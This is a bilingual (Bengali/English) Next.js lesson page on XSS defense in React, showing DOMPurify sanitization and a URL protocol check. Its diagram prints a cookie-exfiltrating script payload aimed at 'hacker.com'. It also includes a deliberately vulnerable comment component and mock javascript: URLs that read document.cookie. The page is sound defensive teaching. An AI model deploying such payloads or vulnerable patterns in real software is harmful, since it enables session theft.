import {
  CodeBlock,
  Diagram,
  H2,
  H3,
  Line,
  Note,
  Table,
} from "@/components/learn/DocParts";
import type { Bi } from "@/lib/curriculum";

/** Section anchors — consumed by the "on this page" rail. */
export const headings: { id: string; label: Bi }[] = [
  {
    id: "the-problem",
    label: {
      bn: "কমেন্ট সেকশনে ইনজেক্ট করা স্ক্রিপ্ট",
      en: "A script injected through comments",
    },
  },
  {
    id: "architecture",
    label: {
      bn: "XSS attack vector ও sanitization",
      en: "XSS attack vector & sanitization",
    },
  },
  {
    id: "mechanisms",
    label: { bn: "৩টি আর্কিটেকচারাল কনসেপ্ট", en: "Three architectural concepts" },
  },
  {
    id: "implementation",
    label: {
      bn: "DOMPurify ও URL protocol গার্ড",
      en: "DOMPurify & URL protocol guards",
    },
  },
  {
    id: "matrix",
    label: { bn: "XSS Defense Comparison", en: "XSS defense comparison" },
  },
  {
    id: "takeaway",
    label: { bn: "Production Takeaways", en: "Production takeaways" },
  },
];

export default function XssProtection() {
  return (
    <article className="doc-prose">
      {/* ── The problem ───────────────────────────────────────────────── */}
      <H2 id="the-problem" anchorOnly>
        কমেন্ট সেকশনে ইনজেক্ট করা স্ক্রিপ্ট
      </H2>

      <p>
        দুপুর ২:৩০। ভুলু ভাই তার নতুন ই-কমার্স ও ব্লগ সাইটের কমেন্ট সেকশন চেক করছিলেন। হঠাৎ দেখলেন একটা
        প্রোডাক্টের রিভিউ সেকশনে কোনো টেক্সট নেই, কিন্তু পেজ রিফ্রেশ হলেই একটি পপআপ দেখাচ্ছে —{" "}
        <code>alert(&quot;Your session has been hijacked!&quot;)</code>। শুধু তা-ই নয়, কিছু ইউজারের
        লোকাল স্টোরেজ ও সেশন ডেটা গায়েব হয়ে অজানা সার্ভারে এক্সফিল্ট্রেট হয়ে যাচ্ছে!
      </p>

      <Line name="ভুলু ভাই">
        ফাহিম! সর্বনাশ হয়ে গেছে! আমাদের ব্লগে আর কমেন্ট সেকশনে কে বা কারা যেন ক্ষতিকারক জাভাস্ক্রিপ্ট
        কোড ইনজেক্ট করে দিয়েছে! ইউজার পেজে ঢোকার সাথে সাথে অচেনা স্ক্রিপ্ট রান করছে! React নাকি
        অটোমেটিক সিকিউর? তাহলে এই অ্যাটাক হলো কীভাবে?
      </Line>

      <Line name="ফাহিম">
        ভুলু ভাই! React বাই-ডিফল্ট JSX রেন্ডারিংয়ের সময় স্ট্রিং এস্কেপ করে বটে, কিন্তু আমরা যখন
        ইউজারের পাঠানো রিচ টেক্সট (HTML) রেন্ডার করতে <code>dangerouslySetInnerHTML</code> ব্যবহার
        করি, কিংবা <code>&lt;a href=&#123;userProvidedUrl&#125;&gt;</code>-এ আন-ভ্যালিডেটেড URL বসাই,
        তখনই XSS অ্যাটাকের দরজা খুলে যায়!
      </Line>

      <Line name="নেক্সট-ভাই">
        একদম! App Router-এ আমরা Server Component-এই ইউজারের পাঠানো র টেক্সট বা HTML সানিটাইজ করতে
        পারি। <code>isomorphic-dompurify</code> এবং URL স্কিম ভ্যালিডেশনের মাধ্যমে ক্লায়েন্টে কোনো
        ম্যালিশিয়াস স্ক্রিপ্ট পৌঁছানোর আগেই তা সার্ভারে ব্লক করে দেব!
      </Line>

      {/* ── Architecture ──────────────────────────────────────────────── */}
      <H2 id="architecture">১. XSS Attack Vector &amp; Sanitization Pipeline</H2>

      <Diagram>{`┌─────────────────────────────────────────────────────────────────────────────┐
│                 NEXT.JS XSS SANITIZATION PIPELINE                           │
└─────────────────────────────────────────────────────────────────────────────┘

 Attacker input: <script>fetch('http://hacker.com/steal?c=' + document.cookie)</script>
                               │
                               ▼
 Server Component (RSC) receives the malicious payload
                               │
                               ▼
        ┌──────────────────────────────────────────────┐
        │  sanitization layer (isomorphic-dompurify)   │
        │  + protocol validator                        │
        └──────────────────────────────────────────────┘
                               │
        ├── strips dangerous tags: <script>, <iframe>, onload="…"
        ├── validates URLs: blocks javascript: pseudo-protocols
        │
        ▼
 Clean HTML output: <span>User comment text</span>
                               │
                               ▼
 🟢 safe HTML streamed to the browser — zero script execution risk`}</Diagram>

      {/* ── Mechanisms ────────────────────────────────────────────────── */}
      <H2 id="mechanisms">২. কোর আর্কিটেকচারাল কনসেপ্ট</H2>

      <p>
        <strong>JSX escaping vs dynamic HTML injection:</strong> React সাধারণভাবে{" "}
        <code>&#123;userData&#125;</code> প্রিন্ট করার সময় <code>&lt;script&gt;</code> ট্যাগকে সাধারণ
        টেক্সটে রূপান্তর করে ফেলে। কিন্তু রিচ-টেক্সট আউটপুট দিতে{" "}
        <code>dangerouslySetInnerHTML</code> ব্যবহার করলে React পার্সিং স্কিপ করে র-HTML ব্রাউজারে
        ইনজেক্ট করে।
      </p>

      <p>
        <strong>JavaScript pseudo-protocol in URLs:</strong> শুধু HTML ট্যাগ নয়, অ্যাটাকাররা অ্যাঙ্কর
        ট্যাগ দিয়েও XSS চালাতে পারে — <code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code>।
        ইউজার এই লিংকে ক্লিক করলেই ব্রাউজার স্ক্রিপ্টটি এক্সিকিউট করে ফেলে।
      </p>

      <p>
        <strong>Isomorphic DOM sanitization:</strong> সার্ভার সাইড (RSC) এবং ক্লায়েন্ট সাইড — দুই
        জায়গাতেই ব্রাউজারের DOM ছাড়াই নিরাপদে HTML ক্লিন করার জন্য Node.js ও browser-ফ্রেন্ডলি
        সানিটাইজার (যেমন <code>isomorphic-dompurify</code>) ব্যবহার করতে হয়।
      </p>

      {/* ── Implementation ────────────────────────────────────────────── */}
      <H2 id="implementation">৩. Production Code Implementation</H2>

      <H3>❌ Anti-pattern — unsanitized HTML and vulnerable links</H3>

      <CodeBlock filename="components/UnsafeComment.tsx">{`// 🔴 POOR PRACTICE: raw user HTML plus an unvalidated URL scheme
// high risk of stored XSS and session theft

interface CommentProps {
  userCommentHtml: string;
  userWebsiteUrl: string;
}

export default function UnsafeComment({ userCommentHtml, userWebsiteUrl }: CommentProps) {
  return (
    <div className="p-4 border rounded">
      {/* ❌ vulnerability 1: injects <script> or <img onerror="…"> straight into the DOM */}
      <div dangerouslySetInnerHTML={{ __html: userCommentHtml }} />

      {/* ❌ vulnerability 2: accepts javascript: URLs */}
      <a href={userWebsiteUrl} target="_blank" rel="noopener noreferrer">
        Visit user profile
      </a>
    </div>
  );
}`}</CodeBlock>

      <H3>🟢 Production pattern — server-side sanitization and safe URL parsing</H3>

      <p>
        <strong>Step 1 — সানিটাইজার ইনস্টল।</strong>
      </p>

      <CodeBlock filename="terminal">{`npm install isomorphic-dompurify`}</CodeBlock>

      <p>
        <strong>Step 2 — safe HTML ও URL রেন্ডারার।</strong>
      </p>

      <CodeBlock filename="components/security/SafeHtml.tsx">{`// 🟢 PRODUCTION PATTERN: isomorphic DOMPurify + safe URL protocol checking
import DOMPurify from 'isomorphic-dompurify';

interface SafeHtmlProps {
  rawHtml: string;
  className?: string;
}

/** Server- and client-safe HTML sanitizer. */
export function SafeHtml({ rawHtml, className }: SafeHtmlProps) {
  // strictly strips dangerous tags and inline execution attributes
  const cleanHtml = DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
  });

  return <div className={className} dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}

/** Protocol sanitizer that blocks javascript: and data: XSS vectors. */
export function sanitizeUrl(url: string): string {
  try {
    const parsed = new URL(url, 'https://dummy-base.com');
    // allow only http: and https:
    if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
      return url;
    }
    return '#'; // safe fallback
  } catch {
    return '#';
  }
}`}</CodeBlock>

      <p>
        <strong>Step 3 — সার্ভার কম্পোনেন্টে নিরাপদ ব্যবহার।</strong>
      </p>

      <CodeBlock filename="app/comments/page.tsx">{`// 🟢 clean execution in the App Router
import { SafeHtml, sanitizeUrl } from '@/components/security/SafeHtml';

interface CommentData {
  id: string;
  author: string;
  htmlContent: string;
  websiteUrl: string;
}

export default async function CommentsPage() {
  // fetched from the DB — treat every field as hostile
  const comment: CommentData = {
    id: '1',
    author: 'John Doe',
    htmlContent: "<p>Awesome post!</p><script>alert('XSS Attack!')</script>",
    websiteUrl: "javascript:alert('Hijack cookie: ' + document.cookie)",
  };

  const safeUrl = sanitizeUrl(comment.websiteUrl);

  return (
    <main className="max-w-xl mx-auto p-6 space-y-4">
      <h1 className="text-xl font-bold">User comments</h1>

      <div className="p-4 border rounded shadow-sm bg-white">
        <h3 className="font-semibold">{comment.author}</h3>

        {/* 🟢 rendered HTML with no script execution */}
        <SafeHtml rawHtml={comment.htmlContent} className="mt-2 text-gray-700" />

        {/* 🟢 protocol-checked URL */}
        <a
          href={safeUrl}
          target="_blank"
          rel="noopener noreferrer"
          className="text-sm text-blue-600 hover:underline mt-2 inline-block"
        >
          Visit the author&apos;s website
        </a>
      </div>
    </main>
  );
}`}</CodeBlock>

      {/* ── Matrix ────────────────────────────────────────────────────── */}
      <H2 id="matrix">৪. XSS Defense Strategy Comparison</H2>

      <Table
        head={[
          "পদ্ধতি",
          "Raw JSX binding {text}",
          "Unsanitized dangerouslySetInnerHTML",
          "DOMPurify sanitization",
        ]}
        rows={[
          [
            "HTML tag execution",
            "সাধারণ টেক্সট হিসেবে প্রিন্ট করে 🟢",
            "র-HTML পার্স করে অ্যাটাক ট্রিগার করে 🔴",
            "শুধু নিরাপদ ট্যাগ রেন্ডার করে 🟢",
          ],
          ["Script execution risk", "জিরো 🟢", "অত্যন্ত ঝুঁকিপূর্ণ 🔴", "সম্পূর্ণ ব্লকড 🟢"],
          [
            "Rich-text support",
            "সাপোর্ট করে না 🔴",
            "সাপোর্ট করে কিন্তু অসুরক্ষিত 🔴",
            "নিরাপদ রিচ-টেক্সট রেন্ডারিং 🟢",
          ],
          [
            "Use case",
            "সাধারণ ইউজার ইনপুট (নাম, মেসেজ)",
            "সুপারিশকৃত নয়",
            "ব্লগ পোস্ট, কমেন্ট, WYSIWYG",
          ],
        ]}
      />

      <Line name="ভুলু ভাই">
        দুর্দান্ত ফাহিম! <code>isomorphic-dompurify</code> আর <code>sanitizeUrl</code> ফাংশন যোগ করার
        পর অ্যাটাকারের পাঠানো ক্ষতিকর <code>&lt;script&gt;</code> আর <code>javascript:</code>{" "}
        লিংকগুলো সম্পূর্ণ ডিজেবল হয়ে গেছে! সাইট এখন নিরাপদ।
      </Line>

      {/* ── Takeaways ─────────────────────────────────────────────────── */}
      <H2 id="takeaway">Production Takeaways</H2>

      <Note>
        <ul>
          <li>
            <strong>Avoid dangerouslySetInnerHTML when you can:</strong> খুব বেশি প্রয়োজন না হলে
            র-HTML রেন্ডার করা এড়িয়ে চলুন — সাধারণ JSX ডাটা বাইন্ডিং React স্বয়ংক্রিয়ভাবে এস্কেপ করে।
          </li>
          <li>
            <strong>Always sanitize rich text:</strong> CMS বা ইউজারের কাছ থেকে HTML ডাটা এলে ডিরেক্ট
            রেন্ডার করার আগে <code>isomorphic-dompurify</code> দিয়ে ফিল্টার করে নিন।
          </li>
          <li>
            <strong>Validate dynamic URLs:</strong> ডাইনামিক URL লিংকে বসানোর আগে প্রোটোকল পরীক্ষা
            করুন, যাতে <code>javascript:</code> বা <code>data:</code> প্রোটোকল দিয়ে XSS না হতে পারে।
          </li>
        </ul>
      </Note>
    </article>
  );
}
